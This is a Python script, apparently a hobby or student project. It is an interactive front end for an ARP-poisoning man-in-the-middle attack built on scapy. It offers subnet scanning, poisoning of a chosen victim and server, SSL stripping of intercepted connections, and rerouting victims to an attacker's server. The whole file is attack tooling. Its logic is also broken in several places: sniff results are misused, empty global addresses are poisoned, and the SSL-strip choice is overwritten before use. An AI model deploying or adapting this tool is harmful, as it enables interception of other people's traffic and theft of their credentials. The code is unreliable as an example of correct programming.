import ARPpoisoning as ArpPoisen;
import sslStripping as sslStripping;
import scapy.all as sc;
victimIP = ""
serverIP = ""
victimMac = ""
serverMac = ""
attackerIP = sc.conf.route.route("0.0.0.0")[1]
attackerMac = sc.get_if_hwaddr(sc.conf.iface)


def main():
    while True:
        ipt = input("Enter a command: Scan, ARP, quit: ").strip().lower()

        if ipt == "scan":
            ip_range = input("Enter ip range").strip().lower()
            hosts = ArpPoisen.network_scan(ip_range)
            for host in hosts:
                print(host)
        elif ipt == "arp":
            targets = input("Enter 'victim ip, server ip' Can both be none").strip().lower()
            goal = input("Enter a goal: mitm, ownServer").strip().lower()
            parts = [p.strip() for p in targets.split(',')]
            if goal == "ownserver":
                ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
                    
            elif goal == "mitm":
                sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
            
            if len(parts) == 2:
                victim_ip = parts[0] if parts[0] != "none" else None
                server_ip = parts[1] if parts[1] != "none" else None

                if (victim_ip is not None and server_ip is None):
                    pkt =  sc.sniff(filter="arp", store=0)

                    if pkt.haslayer(sc.ARP):
                        arp = pkt[sc.ARP]
                        if arp.op == 1 and arp.psrc == victim_ip:
                            serverMac, victimMac = ArpPoisen.arp_poisonening(victim_ip, arp.pdst)
                            
                
                if (victim_ip is None and server_ip is None):
                    pkt =  sc.sniff(filter="arp", store=0)
                    if pkt.haslayer(sc.ARP):
                        arp = pkt[sc.ARP]
                        if arp.op == 1:
                            serverMac, victimMac = ArpPoisen.arp_poisonening(arp.psrc, arp.pdst)
                	
                print(f"Victim IP: {victim_ip}")
                print(f"Server IP: {server_ip}")
                serverMac, victimMac = ArpPoisen.arp_poisonening(victimIP, serverIP)

                ownServer = ""
                sslStrip = ""
                if goal == "ownserver":
                    #now reroute to other website
                    return
                    
                elif goal == "mitm":
                    pkt = sc.sniff(filter="tcp", store=0)
                    if pkt.haslayer(sc.TCP):
                        tcp = pkt[sc.TCP]
                        if tcp.flags == "S":
                            if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
                                continue
                            if (sslStrip == "yes"):
                                sslStripping.stripping(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
                            else:
                                sslStripping.forward(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
            else:
                print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
        elif ipt == "quit":
            break
        else:
            print("Unknown command. Try again.")

if __name__ == "__main__":
    main()